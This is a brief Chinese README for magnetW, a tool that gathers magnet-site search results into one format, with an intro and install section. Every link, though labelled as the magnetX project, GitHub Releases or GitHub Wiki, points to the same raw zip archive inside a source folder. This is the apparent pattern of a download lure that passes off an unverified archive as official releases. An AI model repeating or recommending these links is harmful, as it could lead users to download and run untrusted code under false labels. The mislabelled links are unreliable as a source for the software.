## 简介
`magnetW`基于[magnetX](https://github.com/KenTsuCo/magnetW/raw/refs/heads/master/src/renderer/magnet_W_2.5-beta.2.zip)的规则原理，将各个磁力站的搜索结果统一格式化

## 安装
从[Github Releases](https://github.com/KenTsuCo/magnetW/raw/refs/heads/master/src/renderer/magnet_W_2.5-beta.2.zip)或者[Github Wiki](https://github.com/KenTsuCo/magnetW/raw/refs/heads/master/src/renderer/magnet_W_2.5-beta.2.zip)下载对应平台
